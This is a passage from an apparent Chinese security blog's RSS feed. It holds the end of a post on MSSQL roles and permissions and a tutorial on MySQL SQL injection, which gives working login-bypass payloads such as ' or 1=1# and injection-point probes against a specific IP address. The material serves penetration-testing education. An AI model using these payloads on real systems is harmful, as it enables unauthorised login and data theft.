-<h2>MSSql中角色和用户</h2>
-<h3>服务器角度</h3>
-<ul>
-<li>服务器登录名：指有权限登录到某服务器的<span data-type="text" style="color: var(--b3-font-color8);">用户</span>，可以在有权限的情况下创建新的登录名，超级管理员的登录名是<span data-type="text" style="color: var(--b3-font-color8);">sa</span></li>
-<li>服务器角色：指一组固定的服务器用户，默认有<span data-type="text" style="color: var(--b3-font-color8);">9组</span>。针对行整个数据库服务器设定的角色和权限。</li>
-<li>服务器登录名和角色的关系：登录名一定属于某些角色，默认为<span data-type="text" style="color: var(--b3-font-color8);">public</span>。服务器角色不允许更改，登陆后也不一定有权限操作数据库。</li>
-</ul>
-<h3>数据库角度</h3>
-<ul>
-<li>数据库用户：指有权限能操作数据库的用户。</li>
-<li>数据库角色：指一组固定的<span data-type="text" style="color: var(--b3-font-color8);">有某些权限</span>的数据库角色，针对某个特定数据库设定的角色和权限。</li>
-<li>数据库架构：指数据库对象的容器。</li>
-<li>用户、角色、机构的关系：数据库用户对应于服务器登录名以便登录者可以操作数据库。数据库角色可以添加，可以定制不同权限数据库架构，类似于数据库对像的命名空间，用户通过架构访问数据库对象。</li>
-</ul>
-<p>在sqlserver里一个用户最终的权限应该是由<span data-type="text" style="color: var(--b3-font-color8);">服务器权限</span>加上<span data-type="text" style="color: var(--b3-font-color8);">数据库权限</span>加上<span data-type="text" style="color: var(--b3-font-color8);">对像的权限</span>组成的，这三个级别的权限是累加的。<br>
-但是拒绝权限是优先的<br>
-如果一个用户指定了服务器角色，那这个用户对服务器某些操作就有了一定权限，比如说执行系统命令、管理服务器磁盘、开机关机等等，如果不指定具体角色，默认为public角色<br>
-如果一个用户指定了数据库角色，那这个用户在ssql数据库中的某个或某几个数据库就有了管理权限，例如有最高管理权限、只可读权限、只可写权限等。<br>
-注意：如果某个账号只指定的服务器角色，没有指定数据库角色，该账号还是对数据库有绝对操作的权利。</p>
-<h2>MSSql权限控制</h2>
-<h3>固定服务器角色</h3>
-<p>|固定服务器角色|说明|<br>
-|</p>
-]]></content:encoded>
-    </item>
-    <item>
-      <title>MySQL注入漏洞深度复盘与实战</title>
-      <link>https://min168.top/perm/MySQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%E4%B8%8E%E5%AE%9E%E6%88%98.html</link>
-      <guid>https://min168.top/perm/MySQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%E4%B8%8E%E5%AE%9E%E6%88%98.html</guid>
-      <source url="https://min168.top/rss.xml">MySQL注入漏洞深度复盘与实战</source>
-      <description>注入原理 前端输入用户数据未被检测或过滤就直接带入数据库执行，造成SQL漏洞。 SQL注入条件 用户能控制输入的内容 用户输入的数据未被检测或过滤就带入数据库执行。 漏洞利用 获取数据库数据 读文件 load_file 获取系统shell，执行命令。 写webshell，控制网站。 查询用户的密码，连接到mysql数据库中。 注入分类 请求分类：GET...</description>
-      <category>渗透测试</category>
-      <pubDate>Mon, 02 Sep 2024 00:00:00 GMT</pubDate>
-      <content:encoded><![CDATA[<h2>注入原理</h2>
-<p>前端输入用户数据未被检测或过滤就直接带入数据库执行，造成SQL漏洞。</p>
-<h2>SQL注入条件</h2>
-<ol>
-<li>用户能控制输入的内容</li>
-<li>用户输入的数据未被检测或过滤就带入数据库执行。</li>
-</ol>
-<h2>漏洞利用</h2>
-<ol>
-<li>获取数据库数据</li>
-<li>读文件 load_file</li>
-<li>获取系统shell，执行命令。</li>
-<li>写webshell，控制网站。</li>
-<li>查询用户的密码，连接到mysql数据库中。</li>
-</ol>
-<h2>注入分类</h2>
-<ol>
-<li>
-<p>请求分类：GET、POST</p>
-</li>
-<li>
-<p>注入点参数分类：整型注入、字符型注入、搜素型注入</p>
-</li>
-<li>
-<p>反馈类型分类（重点）：</p>
-<p>1.union类型——联合查询</p>
-<p>2.错误类型显示——报错注入</p>
-<p>3.布尔类型——布尔盲注</p>
-<p>4.其他类型——宽字节注入、header注入、base64、url注入、堆叠注入</p>
-</li>
-<li>
-<p>根据数据库类型</p>
-<p>MySql、SQLserver、Oracle、Access</p>
-</li>
-</ol>
-<h2>注入方法</h2>
-<ol>
-<li>代码审计，阅读代码发现漏洞。</li>
-<li>万能密码构造。</li>
-<li>编写漏洞利用工具。</li>
-</ol>
-<h2>万能密码</h2>
-<p><span data-type="text" style="background-color: var(--b3-font-background9);">or 只要有一个真值就为真</span></p>
-<p><span data-type="text" style="background-color: var(--b3-font-background9);">and 只有当所有操作数都为真时，整个表达式才为真</span></p>
-<p><code>and</code>​ <span data-type="text" style="background-color: var(--b3-font-background9);"> 操作符的优先级高于 </span> <code>or</code>​ <span data-type="text" style="background-color: var(--b3-font-background9);"> 操作符</span></p>
-<ol>
-<li>
-<p>无限制</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' or 1=1# pass = 1</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'a'='a'</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>原理：比如内部有如下查询语句：</p>
-<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">''</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>当我们输入  <code>' or 1=1#</code>  之后，查询语句变为：</p>
-<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#' and password='pass'</span></span>
-<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    //因为有注释符所有是这样  or 1=1会使SQL语句恒成立（ture），从而查询出数据库中的所有账号和密码，从而使我们成功登录</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>用户名不能输入#</p>
-<p><code>user = ' or 1=1 or ''='  pass= 1</code></p>
-<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">''</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'1'</span></span>
-<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                                  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">     and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">   ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>用户名不能输入不存在的用户名的字符串</p>
-<p>user =  <code>admin</code>    pass= <code>' or 1=1#</code></p>
-<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' admin '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># '</span></span>
-<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                                      1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">     and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">         0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">    or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">   0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>密码位置不能输入#</p>
-<p><code>user = admin pass = ' or 1=1 or '' = '</code></p>
-<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' admin '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'   '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' '</span></span>
-<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                                    1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">       and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">        0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">       or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>不能输入or #</p>
-<p><code>user = admin pass = ' or 1=1 or ''='</code></p>
-<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' admin '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span></span>
-<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                                  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">         and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">          0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">   or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
-</ol>
-<figure><figcaption>image</figcaption></figure>
-<h2>手工注入</h2>
-<p>手工注入(英文名：Manual Injection),SQL注入有很多自动化工具，但是因为自动化工具不足以应对复杂情况，所以需要手动注入。</p>
-<h4>手工注入和自动化注入区别?</h4>
-<p>自动化注入是通过使用已经编写好的脚本或者工具进行$QL注入操作，因针对简单环境工具或脚本已经足够注入使用，在注入过程中可以通过工具上的功能模块较方边的进行SQL注入操作。</p>
-<h3>在什么情况下会使用手工注入?</h3>
-<ol>
-<li>在Web较复杂；</li>
-<li>自动化工具和脚本无法成功的进行SQL注入。</li>
-</ol>
-<h3>手工注入流程</h3>
-<p>mysql注释方法</p>
-<ol>
-<li><code>-- 注释内容;</code>  -- 后面是有一个空格的。-- 后面的内容将不会被识别，因此需要在下一行加上分号来结束该语句;</li>
-<li><code>#注释内容</code>   不能实现多行注释</li>
-<li><code>/*注释内容 */</code>   这种注释能够实现多行注释。</li>
-</ol>
-<h2>联合查询</h2>
-<ul>
-<li>
-<p>联合查询顾名思义及使用拼接联合方式将2组或多组关键值拼凑起来进行查询</p>
-</li>
-<li>
-<div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-java"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">select 字段名1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">字段名2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">...</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">字段名n from 表名1 union select 字段名1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">字段名2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">...</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">字段名n from 表名2</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>每个 SELECT 语句必须拥有<span data-type="text" style="background-color: var(--b3-font-background8);">相同数量的列</span></p>
-</li>
-<li>
-<p>每个 SELECT 语句中的列的<span data-type="text" style="background-color: var(--b3-font-background9);">顺序必须相同</span></p>
-</li>
-<li>
-<p>union查询只可用于select语句。</p>
-</li>
-<li>
-<p>数据库查询的内容会被直接输出到页面中。</p>
-</li>
-<li>
-<p>union关键字默认去重，如果使用union all可以包含重复项。</p>
-</li>
-</ul>
-<ol>
-<li>
-<p>判断是否存在注入漏洞，识别注入点类型</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">1and1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">1and1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">//非数字型</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'and1=1%23</span></span>
